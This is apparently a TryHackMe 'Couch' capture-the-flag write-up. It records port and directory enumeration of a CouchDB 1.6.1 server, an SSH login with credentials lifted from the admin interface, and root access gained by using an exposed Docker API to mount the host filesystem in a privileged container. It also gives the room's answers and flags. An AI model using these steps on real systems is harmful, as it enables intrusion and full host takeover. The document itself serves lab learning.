---
tags:
  - taryhackme
  - challenge
  - easy
  - offensive
  - linux
  - docker-escape
---

# Couch
![Couch logo](logos/couch_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Couch](https://tryhackme.com/room/couch)  

## Description
"Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge."

## Enumeration
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
```
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 5.4 (96%), Linux 4.4 (95%), Amazon Fire TV (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
??? success "Scan the machine. How many ports are open?"
	2
??? success "What is the database management system installed on the server?"
	couchdb
??? success "What port is the database management system running on?"
	5984
??? success "What is the version of the management system installed on the server?"
	1.6.1

### HTTP Enumeration (couchdb - port 5984)
```
ffuf -u http://TARGET_IP_ADDRESS:5984/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
```
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://TARGET_IP_ADDRESS:5984/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 127, Words: 1, Lines: 2, Duration: 32ms]
secret                  [Status: 200, Size: 229, Words: 1, Lines: 2, Duration: 25ms]
couch                   [Status: 200, Size: 228, Words: 1, Lines: 2, Duration: 20ms]
                        [Status: 200, Size: 127, Words: 1, Lines: 2, Duration: 18ms]
_log                    [Status: 200, Size: 1000, Words: 130, Lines: 10, Duration: 19ms]
```

**Action(s)**  
:white_check_mark: Rerun `ffuf` scan using the "_" prefix

```
ffuf -u http://TARGET_IP_ADDRESS:5984/_FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
```
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://TARGET_IP_ADDRESS:5984/_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

stats                   [Status: 200, Size: 4794, Words: 156, Lines: 2, Duration: 23ms]
users                   [Status: 200, Size: 230, Words: 1, Lines: 2, Duration: 25ms]
plugins                 [Status: 405, Size: 60, Words: 3, Lines: 2, Duration: 21ms]
log                     [Status: 200, Size: 1000, Words: 145, Lines: 13, Duration: 25ms]
config                  [Status: 200, Size: 4808, Words: 80, Lines: 2, Duration: 18ms]
utils                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
session                 [Status: 200, Size: 174, Words: 1, Lines: 2, Duration: 19ms]
replicator              [Status: 200, Size: 235, Words: 1, Lines: 2, Duration: 23ms]
```
??? success "What is the path for the web administration tool for this database management system?"
	_utils

### Vulnerability Enumeration
```
searchsploit OpenSSH 		# Only result: username enumeration
searchsploit couchdb 1.6.1	# Only result: RCE Python script
```

## Foothold
[CouchDB documentation](https://docs.couchdb.org/en/stable/api/server/common.html)
??? success "What is the path to list all databases in the web browser of the database management system?"
	_all_dbs

**Action(s)**  
:white_check_mark: Enumerate linked paged from `/_utils` endpoint  
??? success "What are the credentials found in the web administration tool?"
	atena:t4qfzcc4qN##

```
ssh atena@10.130.147.202         

atena@10.130.147.202's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

atena@ubuntu:~$ ls -al
total 48
drwxr-xr-x 6 atena atena 4096 Dec 18  2020 .
drwxr-xr-x 3 root  root  4096 Oct 24  2020 ..
-rw------- 1 atena atena 3171 Dec 18  2020 .bash_history
-rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
-rw-r--r-- 1 atena atena 3771 Oct 24  2020 .bashrc
drwxr-xr-x 3 root  root  4096 Oct 24  2020 .bundle
drwx------ 2 atena atena 4096 Oct 24  2020 .cache
drwx------ 2 root  root  4096 Oct 24  2020 .gnupg
drwxrwxr-x 2 atena atena 4096 Dec 18  2020 .nano
-rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
-rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
-rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts

atena@ubuntu:~$ cat user.txt
```
??? success "Compromise the machine and locate user.txt"
	THM{1ns3cure_couchdb}

## Privilege Escalation
```
atena@ubuntu:~$ cat .bash_history
<REDACTED FOR BREVITY>
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
uname -a
exit

atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

/ $ ls -al /root
total 12
drwx------    1 root     root          4096 May 20 07:20 .
drwxr-xr-x    1 root     root          4096 May 20 07:20 ..
-rw-------    1 root     root            13 May 20 07:20 .ash_history

/ $ ls -al /
total 64
drwxr-xr-x    1 root     root          4096 May 20 07:20 .
drwxr-xr-x    1 root     root          4096 May 20 07:20 ..
-rwxr-xr-x    1 root     root             0 May 20 07:20 .dockerenv
drwxr-xr-x    2 root     root          4096 Dec 16  2020 bin
drwxr-xr-x   13 root     root          3560 May 20 07:20 dev
drwxr-xr-x    1 root     root          4096 May 20 07:20 etc
drwxr-xr-x    2 root     root          4096 Dec 16  2020 home
drwxr-xr-x    7 root     root          4096 Dec 16  2020 lib
drwxr-xr-x    5 root     root          4096 Dec 16  2020 media
drwxr-xr-x   22 root     root          4096 Oct 25  2020 mnt
drwxr-xr-x    2 root     root          4096 Dec 16  2020 opt
dr-xr-xr-x  104 root     root             0 May 20 07:20 proc
drwx------    1 root     root          4096 May 20 07:20 root
drwxr-xr-x    2 root     root          4096 Dec 16  2020 run
drwxr-xr-x    2 root     root          4096 Dec 16  2020 sbin
drwxr-xr-x    2 root     root          4096 Dec 16  2020 srv
dr-xr-xr-x   13 root     root             0 May 20 07:18 sys
drwxrwxrwt    2 root     root          4096 Dec 16  2020 tmp
drwxr-xr-x    7 root     root          4096 Dec 16  2020 usr
drwxr-xr-x   12 root     root          4096 Dec 16  2020 var

/ $ ls -al /mnt
total 92
drwxr-xr-x   22 root     root          4096 Oct 25  2020 .
drwxr-xr-x    1 root     root          4096 May 20 07:20 ..
drwxr-xr-x    2 root     root          4096 Oct 25  2020 bin
drwxr-xr-x    3 root     root          4096 Oct 25  2020 boot
drwxr-xr-x   17 root     root          3700 May 20 07:18 dev
drwxr-xr-x   90 root     root          4096 Dec 19  2020 etc
drwxr-xr-x    3 root     root          4096 Oct 25  2020 home
lrwxrwxrwx    1 root     root            33 Oct 25  2020 initrd.img -> boot/initrd.img-4.4.0-193-generic
lrwxrwxrwx    1 root     root            33 Oct 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   20 root     root          4096 Dec 18  2020 lib
drwxr-xr-x    2 root     root          4096 Oct 25  2020 lib64
drwx------    2 root     root         16384 Oct 25  2020 lost+found
drwxr-xr-x    4 root     root          4096 Oct 25  2020 media
drwxr-xr-x    2 root     root          4096 Feb 26  2019 mnt
drwxr-xr-x    3 root     root          4096 Dec 18  2020 opt
dr-xr-xr-x  104 root     root             0 May 20 07:18 proc
drwx------    3 root     root          4096 Dec 18  2020 root
drwxr-xr-x   21 root     root           680 May 20 07:20 run
drwxr-xr-x    2 root     root         12288 Dec 18  2020 sbin
drwxr-xr-x    2 root     root          4096 Feb 26  2019 srv
dr-xr-xr-x   13 root     root             0 May 20 07:18 sys
drwxrwxrwt    9 root     root          4096 May 20 07:20 tmp
drwxr-xr-x   10 root     root          4096 Oct 25  2020 usr
drwxr-xr-x   11 root     root          4096 Oct 25  2020 var
lrwxrwxrwx    1 root     root            30 Oct 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-193-generic
lrwxrwxrwx    1 root     root            30 Oct 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic

/ $ ls -al /mnt/root
total 24
drwx------    3 root     root          4096 Dec 18  2020 .
drwxr-xr-x   22 root     root          4096 Oct 25  2020 ..
-rw-r--r--    1 root     root          3106 Oct 22  2015 .bashrc
drwxr-xr-x    2 root     root          4096 Oct 25  2020 .nano
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root            26 Dec 18  2020 root.txt

/ $ cat /mnt/root/root.txt
```
??? success "Escalate privileges and obtain root.txt"
	THM{RCE_us1ng_Docker_API}

**Tools Used**  
`docker`

**Date completed:** 20/05/26  
**Date published:** 20/05/26